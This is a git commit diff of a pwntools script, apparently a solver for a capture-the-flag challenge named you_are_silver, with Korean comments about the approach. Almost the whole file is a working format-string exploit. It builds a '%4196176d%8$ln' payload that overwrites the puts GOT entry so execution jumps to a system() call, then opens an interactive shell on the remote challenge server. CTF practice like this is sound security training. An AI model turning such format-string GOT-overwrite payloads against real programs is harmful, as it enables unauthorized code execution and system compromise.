ba9a5404343cb3444f49e357185b2185d6805b98
fr0g2s <turttle2s@naver.com>
2021-07-01 05:37:03 -0700

    fsb 연습좀 하고오니까 다른 솔루션으로 해야했음

--- you_are_silver.py
+++ you_are_silver.py
@@ -1,10 +1,28 @@
 from pwn import *
 
-# 64bit fsb
-# get_tier 인자를 0x4c로 변조한다
-# printf를 play_game으로 변조한다.
+# 처음엔 조건 맞춰줘야하는줄 알았는데,
+# 그냥 play_game에서 system() 부분을 실행하면됨.
+# printf@got 조작으로 실행
 
 p = remote('ctf.j0n9hyun.xyz',3022)
+#p = process('./you_are_silver')
 e = ELF('./you_are_silver')
-play_game = e.sym['play_game']
-buff = 6	# 6번째 인자 
+printf_got = e.got['printf']
+puts_got = e.got['puts']
+
+shell = 4196176
+
+print('[*] printf@got ', hex(printf_got))
+
+input('attach gdb')
+
+print(p.recvline())	# Please enter your name
+
+payload = b''
+payload += b'%4196176d%8$ln  '
+payload += p64(puts_got)
+
+p.sendline(payload)
+time.sleep(1)
+print(p.recv())
+p.interactive()
